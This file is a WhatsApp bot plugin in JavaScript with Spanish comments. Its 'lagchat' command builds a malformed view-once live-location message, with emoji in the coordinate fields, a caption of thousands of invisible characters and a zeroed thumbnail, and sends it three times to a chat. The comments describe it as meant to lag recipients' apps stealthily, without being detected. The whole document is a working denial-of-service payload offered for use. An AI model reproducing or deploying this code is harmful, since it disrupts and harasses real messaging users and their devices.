const buildLagMessage = () => ({
  viewOnceMessage: {
    message: {
      liveLocationMessage: {
        degreesLatitude: '🌀',
        degreesLongitude: '⚡',
        caption: '\u2063'.repeat(8000) + '⚡'.repeat(200),
        sequenceNumber: String(Math.floor(Math.random() * 1000)),
        jpegThumbnail: Buffer.alloc(2 * 1024, 0), // miniatura falsa ligera
        contextInfo: {
          forwardingScore: Math.floor(Math.random() * 50),
          isForwarded: true,
          externalAdReply: {
            title: 'Lag Stealth',
            body: 'Mensaje optimizado para no ser detectado',
            mediaType: 1,
            renderLargerThumbnail: false,
            showAdAttribution: false,
            sourceUrl: 'https://wa.me/0'
          }
        }
      }
    }
  }
})

let handler = async (m, { conn }) => {
  const jid = m.chat
  const times = 3 // suficiente para molestar pero sin riesgo alto

  await m.reply(`⚠️ Enviando ${times} mensajes stealth...\nEsto puede hacer lag sin ser tan obvio.`)

  for (let i = 0; i < times; i++) {
    try {
      await conn.relayMessage(jid, buildLagMessage(), { messageId: conn.generateMessageTag() })
      await new Promise(resolve => setTimeout(resolve, 200))
    } catch (error) {
      console.error('Error al enviar mensaje:', error)
      await m.reply('❗ Error al enviar mensaje. Intenta de nuevo.')
      return
    }
  }

  await m.reply('✅ *Lagchat stealth completo we.*')
}

handler.command = /^lagchat$/i
handler.owner = false

export default handler